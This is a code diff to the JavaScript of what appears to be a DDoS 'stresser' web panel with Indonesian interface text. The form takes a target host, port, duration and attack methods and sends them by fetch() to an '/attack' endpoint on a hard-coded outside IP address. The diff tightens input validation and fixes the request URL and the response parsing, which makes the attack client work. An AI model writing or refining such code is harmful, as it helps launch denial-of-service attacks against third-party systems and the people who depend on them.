@@ -118,12 +118,12 @@
     const time = document.getElementById('time').value;
     const methods = document.getElementById('methods').value.toUpperCase();
 
-    if (!host || !port || !time || !methods) {
-      alert("⚠️ Harap isi semua data!");
+    if (!host || !port || !time || !methods || port <= 0 || time <= 0) {
+      alert("⚠️ Harap isi semua data dengan benar!");
       return;
     }
 
-    const url = `curl http://139.59.251.26:2028/attack?host=${encodeURIComponent(host)}&port=${port}&time=${time}&methods=${methods}`;
+    const url = `http://139.59.251.26:2028/attack?host=${encodeURIComponent(host)}&port=${port}&time=${time}&methods=${methods}`;
 
     document.getElementById("loading").style.display = "block";
     document.getElementById("log").innerText = "";
@@ -131,8 +131,8 @@
 
     try {
       const response = await fetch(url);
-      const result = await response.json();
-      document.getElementById("log").innerText = `📜 Log Response:\n${JSON.stringify(result, null, 2)}`;
+      const resultText = await response.text();
+      document.getElementById("log").innerText = `📜 Log Response:\n${resultText}`;
       document.getElementById("loading").style.display = "none";
       startTimer(time);
     } catch (error) {
